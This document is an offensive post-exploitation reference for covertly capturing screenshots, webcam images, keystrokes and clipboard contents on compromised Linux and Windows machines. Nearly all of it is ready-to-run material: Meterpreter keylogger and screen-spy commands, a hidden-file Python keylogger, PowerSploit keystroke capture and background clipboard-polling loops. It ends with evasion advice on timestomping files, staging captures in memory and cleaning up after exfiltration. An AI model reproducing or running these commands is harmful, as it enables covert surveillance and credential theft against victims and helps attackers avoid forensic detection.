# Screen Capture, Keylogging & Clipboard Reference

## Screenshots

### Meterpreter

```bash
# Single screenshot
meterpreter > screenshot
# Saved to: /home/user/.msf4/loot/YYYYMMDD..._screenshot.jpeg

# Timed screen spy (multiple captures)
meterpreter > run post/multi/gather/screen_spy DELAY=5 COUNT=20
# DELAY = seconds between captures, COUNT = number of screenshots

# Webcam (bonus)
meterpreter > webcam_snap
meterpreter > webcam_stream
```

### Linux (X11)

```bash
# xwd — X Window Dump (built into most X11 installs)
DISPLAY=:0 xwd -root -out /tmp/screen.xwd
# Convert: convert /tmp/screen.xwd /tmp/screen.png

# import — ImageMagick (most common)
DISPLAY=:0 import -window root /tmp/screen.png

# scrot — simple screenshot tool
DISPLAY=:0 scrot /tmp/screen.png
DISPLAY=:0 scrot -d 5 /tmp/screen.png      # 5-second delay

# gnome-screenshot
DISPLAY=:0 gnome-screenshot -f /tmp/screen.png

# Wayland (if X11 isn't available)
grim /tmp/screen.png                        # wlroots-based compositors
```

**Critical:** Set `DISPLAY=:0` when running from a non-interactive shell (SSH, reverse shell).
Without it, X11 tools cannot connect to the display server.

### Windows

```powershell
# PowerShell .NET screenshot
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
$bitmap.Save("C:\Windows\Temp\s.png")
$graphics.Dispose()
$bitmap.Dispose()

# Nircmd (lightweight, less suspicious)
nircmd savescreenshot "C:\Windows\Temp\s.png"
```

---

## Keylogging

### Meterpreter Keylogger

```bash
# Basic keylogging
meterpreter > keyscan_start                 # start capture
meterpreter > keyscan_dump                  # retrieve keys (non-destructive, can dump multiple times)
meterpreter > keyscan_stop                  # stop capture

# Post module (more reliable, auto-saves)
meterpreter > run post/windows/capture/keylog_recorder CAPTURE_TYPE=explorer INTERVAL=30
# CAPTURE_TYPE: explorer (desktop), winlogon (login screen)
# INTERVAL: seconds between dumps to loot file
# Output: ~/.msf4/loot/

# Best practice: migrate to explorer.exe or a user process first
meterpreter > ps | grep explorer
meterpreter > migrate <PID>
meterpreter > keyscan_start
```

### Linux Keyloggers

```bash
# logkeys — Linux kernel-level keylogger
logkeys --start --output /tmp/.keys.log
logkeys --stop
cat /tmp/.keys.log

# xinput (X11 event capture — requires X11)
DISPLAY=:0 xinput list                      # list input devices
DISPLAY=:0 xinput test <keyboard-id>        # live key events

# Python keylogger (requires pynput)
python3 -c "
from pynput.keyboard import Listener
import logging
logging.basicConfig(filename='/tmp/.k.log', level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) as l:
    l.join()
" &
```

### Windows Keyloggers (Beyond Meterpreter)

```powershell
# PowerShell Get-Keystrokes (PowerSploit)
Import-Module .\PowerSploit.psd1
Get-Keystrokes -LogPath C:\Windows\Temp\keys.log

# Or use the built-in Metasploit post module
run post/windows/capture/keylog_recorder
```

---

## Clipboard Capture

### Linux

```bash
# xclip (most common)
xclip -selection clipboard -o               # clipboard contents
xclip -selection primary -o                 # primary selection (highlight to copy)
xclip -selection secondary -o               # secondary selection

# xsel alternative
xsel --clipboard --output
xsel --primary --output

# Continuous clipboard monitoring (loop)
while true; do
  CLIP=$(xclip -selection clipboard -o 2>/dev/null)
  if [ "$CLIP" != "$LAST_CLIP" ]; then
    echo "$(date): $CLIP" >> /tmp/.clipboard.log
    LAST_CLIP="$CLIP"
  fi
  sleep 2
done &

# Wayland
wl-paste                                    # current clipboard
wl-paste --watch cat >> /tmp/.clipboard.log  # monitor changes
```

### Windows

```powershell
# Single capture
Get-Clipboard
Get-Clipboard -Format Text
Get-Clipboard -Format FileDropList          # copied files/folders
Get-Clipboard -Format Image                 # copied images

# Continuous monitoring
while($true) {
  $clip = Get-Clipboard -ErrorAction SilentlyContinue
  if ($clip -ne $last) {
    "$(Get-Date): $clip" | Out-File -Append C:\Windows\Temp\clip.log
    $last = $clip
  }
  Start-Sleep -Seconds 2
}

# Meterpreter
meterpreter > run post/windows/gather/clipboard
```

---

## OPSEC Notes

- **Screenshots:** Generate files on disk — clean up after exfil
- **Keyloggers:** Kernel-level (logkeys) more reliable than userspace; both leave processes
- **Clipboard:** Polling loop creates minimal footprint but runs continuously
- **Migration:** Always migrate Meterpreter to a stable user process before keylogging
- **Timestamps:** `touch -r /etc/hosts /tmp/screen.png` to blend file timestamps
- **RAM-only:** Stage captures to `/dev/shm/` on Linux to avoid disk forensics
